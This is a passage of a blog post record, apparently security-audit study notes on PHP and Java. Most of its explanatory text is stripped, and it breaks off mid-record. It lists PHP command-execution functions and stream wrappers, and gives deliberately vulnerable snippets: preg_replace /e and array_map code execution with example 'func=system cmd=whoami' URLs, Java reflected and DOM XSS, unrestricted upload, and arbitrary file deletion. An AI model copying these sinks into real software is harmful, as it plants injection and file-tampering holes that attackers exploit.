'highlight_file').PHP_EOL);\nhighlight_file('flag.txt');\necho PHP_EOL;\n\n\n?>\n\n```\n\nPHP fweite() file_put_contents()\n\n```php\n<?php\n$file = fopen(\"test.txt\",\"w\");\necho fwrite($file,\"Hello World. Testing!\");\nfclose($file);\n?>\n\n<?php\necho file_put_contents(\"test.txt\",\"Hello World. Testing!\");\n?>\n```\n\n\n\n### 5.php \n\n- `include`\n\n  ```\n  <?php include 'test.php';?>\n  ```\n\n- `include_once`  \n\n- `require` include\n\n- `require_once`   require_once \n\n\n\n> 1includerequire2require_onceinclude_onceincluderequire\n\n\n\n### 6.php\n\n- `serialize()`  \n\n- `unserialize()` \n\n-  \n\n  ```\n  1.__construct()\n  \n  2.__destruct()\n  \n  3.__call()\n  \n  4.__callStatic()\n  \n  5.__get()\n  \n  6.__set()\n  \n  7.__isset()isset()empty()\n  \n  8.__unset()unset()\n  \n  9.__sleep()serialize()\n  \n  10.__wakeup()unserialize()\n  \n  11.__toString()\n  \n  12.__invoke()\n  \n  13.__set_state()var_export()\n  \n  14.__clone()\n  \n  15.__autoload()\n  \n  16.__debugInfo()\n  ```\n\n### 7.php \n\n- `$_GET`  $_GET  method=\"get\" \n\n   GET \n\n- `$POST` $_POST  method=\"post\" \n\n   POST \n\n- `$_REQUEST` $_GET$POST\n\n- `$_FILES` \n\n- `$_COOKIE` cookie \n\n- `$SESSION`Session\n\n## JAVA\n\n### 1.Web\n\njava EE web\n\n**tomcat   jetty  resin**\n\njava EE web \n\n**JBOSS   GlassFish   Weblogic   Webshpere**\n\n\n\n\n\nhttps://zhuanlan.zhihu.com/p/399939177\n\n### 2.tomcat\n\n- `bin`:bat\n- `conf`:Tomcat\n- `lib`:Tomcatjarjar\n- `temp`:Tomcat\n- `webapps`:jar\n- `work`worktomcatJSP \n\n\n\n### 3.tomcatweb.xml  tomcat_user.xml \n\n`web.xml`\nTomcatweb.xmlconfweb.xml.,Tomcatweb.xmlweb.xml(WEB-INF/web.xml).tomcatjspservlet,listjsp,404..\n\n`tomcat-users.xml`\n tomcat.tomcathttp://localhost:8080tomcat manager,xml\n\n\n\n### 4.jsp\n\n> JSPJava Server PagesJSPHTMLJava<%%>\n>\n> JSPJava servletJava webHTMLXHTMLXMLJSPJSP\n>\n> JSP\n>\n> JSPJavaBeans\n\n\n\n### 5.java xss\n\n```\nxss   (name) \n<%\nString name = request.getParameter(\"name\");\nout.println(name)\n%>\n xss  (msg) \npublic void Message(HttpServletRequest req, HttpServletResponse resp) {\n\tString message = req.getParameter(\"msg\");\ntry{\n\tresp.getWriter().print(message);\n} catch (IOException e) {\n\te. printStackTrace();\n}\nDOM xssJavaScript\n<script>\n    var pos = document.URL.indexOf(\"#\")+1;\n    var name = document.URL.substring(pos, document.URL.length);\n    document.write(name);\neval(\"var a = \" + name);\n</script>\nxss JDBC\n```\n\n\n\n### 6.Java \n\n```\nFiles.readAllBytesFiles.readAllLines\nFileInputStream\nFileOutputStream\nFile\nFileUtils\nIOUtils\nBufferedReader\nServletFileUpload\nMultipartFile\nCommonsMultipartFile\nPrintWriter\nZipInputStream\nZipEntry.getSize\n```\n\n\n\n### 7.\n\n```\nDiskFileItemFactory@MultipartConfigMultipartFileFile\nUpload\nInputStream\nOutputStream\nwrite\nfileName\nfilePath\n```\n\n\n\n### 8.servlet\n\n> servlet3\n> commons-fileuploadcommons-iojar\n>\n> servlet3\n> request.getParts()\n\n\n\n### 9.java\n\n```\nprivate boolean uploadWithAnnotation(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n    Part part = request.getPart(\"fileName\");\n    if(part == null) {\n      return false;\n    }\n    String filename = UPLOAD_PATH + File.separator + part.getSubmittedFileName();\n    part.write(filename);\n    part.delete();\n    return true;\n}\n```\n\n\n\n### 10.\n\n```\nString filename = request.getParameter(\"filename\");\nFile file = new File(filename);\nif(file != null && file.exists() && file.delete()) {\n  \tresponse.getWriter().println(\"delete success\");\n} else {\n  \tresponse.getWriter().println(\"delete failed\");\n}\n```","slug":"PHP  JAVA","published":1,"updated":"2024-04-17T08:43:00.187Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7ij0008h77632qx5n8c","content":"<h1 id=\"PHP-JAVA\"><a href=\"#PHP-JAVA\" class=\"headerlink\" title=\"PHP &#x2F; JAVA\"></a>PHP &#x2F; JAVA</h1><h2 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h2><h3 id=\"1-php-\"><a href=\"#1-php-\" class=\"headerlink\" title=\"1.php \"></a>1.php </h3><ul>\n<li><code>system()</code> OS</li>\n<li><code>passthru()</code>OS</li>\n<li><code>exec()</code>OS</li>\n<li><code>shell_exec</code> OS</li>\n<li><code>popen()/proc_open()</code>OS**<u>fread</u>**</li>\n<li><code> </code> [&#96;&#96;]OS</li>\n</ul>\n<h3 id=\"2-phpphp-ini\"><a href=\"#2-phpphp-ini\" class=\"headerlink\" title=\"2.phpphp.ini\"></a>2.phpphp.ini</h3><p>php</p>\n<ul>\n<li><p><code>file://</code>  file:&#x2F;&#x2F; offallow_url_fopen off&#x2F;on allow_url_includeoff&#x2F;on</p>\n</li>\n<li><p><code>php://filter</code> base64phpoff</p>\n</li>\n<li><p><code>php://input</code> POSTallow_url_fopen off&#x2F;on</p>\n<p>allow_url_includeon</p>\n</li>\n<li><p><code>zip:// compress.bzip:// compress.zlib://</code>off</p>\n</li>\n<li><p><code>data://</code> PHPon</p>\n</li>\n<li><p><code>phar:/</code>&#x2F;  zipzipphar</p>\n</li>\n</ul>\n<h3 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h3><ul>\n<li><p><code>preg_replace()</code> php 5.6 &#x2F;e  magic_quotes_gpc&#x3D;Off php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tpreg_replace(&#x27;/&lt;php&gt;(.*?)&#x27; . $_GET[&#x27;reg&#x27;], &#x27;\\\\1&#x27; ,&#x27;&lt;php&gt;phpinfo()&lt;php&gt;&#x27;);</span><br><span class=\"line\">\tpreg_replace(&#x27;/anything/e&#x27;, $_GET[&#x27;test&#x27;], &#x27;anything_test&#x27;);</span><br><span class=\"line\">\tpreg_replace(&#x27;/&lt;php&gt;(.*?)&lt;\\/php&gt;/e&#x27;, &#x27;\\\\1&#x27;, $_GET[&#x27;test&#x27;]);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>array_map()</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $func=$_GET[&#x27;func&#x27;];</span><br><span class=\"line\">    $cmd=$_POST[&#x27;cmd&#x27;];</span><br><span class=\"line\">    $array[0]=$cmd;</span><br><span class=\"line\">    $new_array=array_map($func,$array);</span><br><span class=\"line\">    echo $new_array;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">//    http://localhost/123.php?func=system   cmd=whoami</span><br><span class=\"line\"> //   http://localhost/123.php?func=assert   cmd</span><br></pre></td></tr></table></figure>\n\n\n</li>\n<li><p><code>assert()</code> </p>\n<blockquote>\n<p>assertPHP</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"4-php--\"><a href=\"#4-php--\" class=\"headerlink\" title=\"4.php &#x2F;\"></a>4.php &#x2F;</h3><p>9</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_get_contents   // *</span><br><span class=\"line\">fread</span><br><span class=\"line\">fgets</span><br><span class=\"line\">fgetss</span><br><span class=\"line\">file</span><br><span class=\"line\">parse_ini_file</span><br><span class=\"line\">readfile    // *</span><br><span class=\"line\">highlight_file  // *</span><br><span class=\"line\">show_source // *</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// file_get_contents</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;file_get_contents&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fread</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fread&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$file</span>,<span class=\"number\">1024</span>);     <span class=\"comment\">//  resource </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fgets</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fgets&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);      </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fgets</span>(<span class=\"variable\">$file</span>, <span class=\"number\">4096</span>);        <span class=\"comment\">//  HTML  PHP </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fgetss</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fgetss&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);     </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fgetss</span>(<span class=\"variable\">$file</span>, <span class=\"number\">4096</span>);        <span class=\"comment\">//  HTML  PHP </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// readfile</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;readfile&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">readfile</span>(<span class=\"string\">&quot;flag.txt&quot;</span>);      <span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">file</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>));      <span class=\"comment\">//  print_r  var_dump </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// parse_ini_file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;parse_ini_file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">parse_ini_file</span>(<span class=\"string\">&quot;flag.txt&quot;</span>);        <span class=\"comment\">//  ini </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// show_source</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;show_source&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// highlight_file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;highlight_file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>PHP fweite() file_put_contents()</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;Hello World. Testing!&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;Hello World. Testing!&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"5-php-\"><a href=\"#5-php-\" class=\"headerlink\" title=\"5.php \"></a>5.php </h3><ul>\n<li><p><code>include</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php include &#x27;test.php&#x27;;?&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>include_once</code>  </p>\n</li>\n<li><p><code>require</code> include</p>\n</li>\n<li><p><code>require_once</code>   require_once </p>\n</li>\n</ul>\n<p></p>\n<blockquote>\n<p>1includerequire2require_onceinclude_onceincluderequire</p>\n</blockquote>\n<h3 id=\"6-php\"><a href=\"#6-php\" class=\"headerlink\" title=\"6.php\"></a>6.php</h3><ul>\n<li><p><code>serialize()</code>  </p>\n</li>\n<li><p><code>unserialize()</code> </p>\n</li>\n<li><p> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.__construct()</span><br><span class=\"line\"></span><br><span class=\"line\">2.__destruct()</span><br><span class=\"line\"></span><br><span class=\"line\">3.__call()</span><br><span class=\"line\"></span><br><span class=\"line\">4.__callStatic()</span><br><span class=\"line\"></span><br><span class=\"line\">5.__get()</span><br><span class=\"line\"></span><br><span class=\"line\">6.__set()</span><br><span class=\"line\"></span><br><span class=\"line\">7.__isset()isset()empty()</span><br><span class=\"line\"></span><br><span class=\"line\">8.__unset()unset()</span><br><span class=\"line\"></span><br><span class=\"line\">9.__sleep()serialize()</span><br><span class=\"line\"></span><br><span class=\"line\">10.__wakeup()unserialize()</span><br><span class=\"line\"></span><br><span class=\"line\">11.__toString()</span><br><span class=\"line\"></span><br><span class=\"line\">12.__invoke()</span><br><span class=\"line\"></span><br><span class=\"line\">13.__set_state()var_export()</span><br><span class=\"line\"></span><br><span class=\"line\">14.__clone()</span><br><span class=\"line\"></span><br><span class=\"line\">15.__autoload()</span><br><span class=\"line\"></span><br><span class=\"line\">16.__debugInfo()</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"7-php-\"><a href=\"#7-php-\" class=\"headerlink\" title=\"7.php \"></a>7.php </h3><ul>\n<li><p><code>$_GET</code>  $_GET  method&#x3D;get </p>\n<p> GET </p>\n</li>\n<li><p><code>$POST</code> $_POST  method&#x3D;post </p>\n<p> POST </p>\n</li>\n<li><p><code>$_REQUEST</code> $_GET$POST</p>\n</li>\n<li><p><code>$_FILES</code> </p>\n</li>\n<li><p><code>$_COOKIE</code> cookie </p>\n</li>\n<li><p><code>$SESSION</code>Session</p>\n</li>\n</ul>\n<h2 id=\"JAVA\"><a href=\"#JAVA\" class=\"headerlink\" title=\"JAVA\"></a>JAVA</h2><h3 id=\"1-Web\"><a href=\"#1-Web\" class=\"headerlink\" title=\"1.Web\"></a>1.Web</h3><p>java EE web</p>\n<p><strong>tomcat   jetty  resin</strong></p>\n<p>java EE web </p>\n<p><strong>JBOSS   GlassFish   Weblogic   Webshpere</strong></p>\n<p></p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/399939177\" >https://zhuanlan.zhihu.com/p/399939177<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"2-tomcat\"><a href=\"#2-tomcat\" class=\"headerlink\" title=\"2.tomcat\"></a>2.tomcat</h3><ul>\n<li><code>bin</code>:bat</li>\n<li><code>conf</code>:Tomcat</li>\n<li><code>lib</code>:Tomcatjarjar</li>\n<li><code>temp</code>:Tomcat</li>\n<li><code>webapps</code>:jar</li>\n<li><code>work</code>worktomcatJSP</li>\n</ul>\n<h3 id=\"3-tomcatweb-xml--tomcat-user-xml-\"><a href=\"#3-tomcatweb-xml--tomcat-user-xml-\" class=\"headerlink\" title=\"3.tomcatweb.xml  tomcat_user.xml \"></a>3.tomcatweb.xml  tomcat_user.xml </h3><p><code>web.xml</code><br>Tomcatweb.xmlconfweb.xml.,Tomcatweb.xmlweb.xml(WEB-INF&#x2F;web.xml).tomcatjspservlet,listjsp,404..</p>\n<p><code>tomcat-users.xml</code><br> tomcat.tomcat<a href=\"http://localhost:8080tomcat\">http://localhost:8080tomcat</a> manager,xml</p>\n<h3 id=\"4-jsp\"><a href=\"#4-jsp\" class=\"headerlink\" title=\"4.jsp\"></a>4.jsp</h3><blockquote>\n<p>JSPJava Server PagesJSPHTMLJava&lt;%%&gt;</p>\n<p>JSPJava servletJava webHTMLXHTMLXMLJSPJSP</p>\n<p>JSP</p>\n<p>JSPJavaBeans</p>\n</blockquote>\n<h3 id=\"5-java-xss\"><a href=\"#5-java-xss\" class=\"headerlink\" title=\"5.java xss\"></a>5.java xss</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xss   (name) </span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">String name = request.getParameter(&quot;name&quot;);</span><br><span class=\"line\">out.println(name)</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"> xss  (msg) </span><br><span class=\"line\">public void Message(HttpServletRequest req, HttpServletResponse resp) &#123;</span><br><span class=\"line\">\tString message = req.getParameter(&quot;msg&quot;);</span><br><span class=\"line\">try&#123;</span><br><span class=\"line\">\tresp.getWriter().print(message);</span><br><span class=\"line\">&#125; catch (IOException e) &#123;</span><br><span class=\"line\">\te. printStackTrace();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">DOM xssJavaScript</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    var pos = document.URL.indexOf(&quot;#&quot;)+1;</span><br><span class=\"line\">    var name = document.URL.substring(pos, document.URL.length);</span><br><span class=\"line\">    document.write(name);</span><br><span class=\"line\">eval(&quot;var a = &quot; + name);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">xss JDBC</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"6-Java-\"><a href=\"#6-Java-\" class=\"headerlink\" title=\"6.Java \"></a>6.Java </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Files.readAllBytesFiles.readAllLines</span><br><span class=\"line\">FileInputStream</span><br><span class=\"line\">FileOutputStream</span><br><span class=\"line\">File</span><br><span class=\"line\">FileUtils</span><br><span class=\"line\">IOUtils</span><br><span class=\"line\">BufferedReader</span><br><span class=\"line\">ServletFileUpload</span><br><span class=\"line\">MultipartFile</span><br><span class=\"line\">CommonsMultipartFile</span><br><span class=\"line\">PrintWriter</span><br><span class=\"line\">ZipInputStream</span><br><span class=\"line\">ZipEntry.getSize</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"7-\"><a href=\"#7-\" class=\"headerlink\" title=\"7.\"></a>7.</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DiskFileItemFactory@MultipartConfigMultipartFileFile</span><br><span class=\"line\">Upload</span><br><span class=\"line\">InputStream</span><br><span class=\"line\">OutputStream</span><br><span class=\"line\">write</span><br><span class=\"line\">fileName</span><br><span class=\"line\">filePath</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"8-servlet\"><a href=\"#8-servlet\" class=\"headerlink\" title=\"8.servlet\"></a>8.servlet</h3><blockquote>\n<p>servlet3<br>commons-fileuploadcommons-iojar</p>\n<p>servlet3<br>request.getParts()</p>\n</blockquote>\n<h3 id=\"9-java\"><a href=\"#9-java\" class=\"headerlink\" title=\"9.java\"></a>9.java</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private boolean uploadWithAnnotation(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException &#123;</span><br><span class=\"line\">    Part part = request.getPart(&quot;fileName&quot;);</span><br><span class=\"line\">    if(part == null) &#123;</span><br><span class=\"line\">      return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    String filename = UPLOAD_PATH + File.separator + part.getSubmittedFileName();</span><br><span class=\"line\">    part.write(filename);</span><br><span class=\"line\">    part.delete();</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"10-\"><a href=\"#10-\" class=\"headerlink\" title=\"10.\"></a>10.</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String filename = request.getParameter(&quot;filename&quot;);</span><br><span class=\"line\">File file = new File(filename);</span><br><span class=\"line\">if(file != null &amp;&amp; file.exists() &amp;&amp; file.delete()) &#123;</span><br><span class=\"line\">  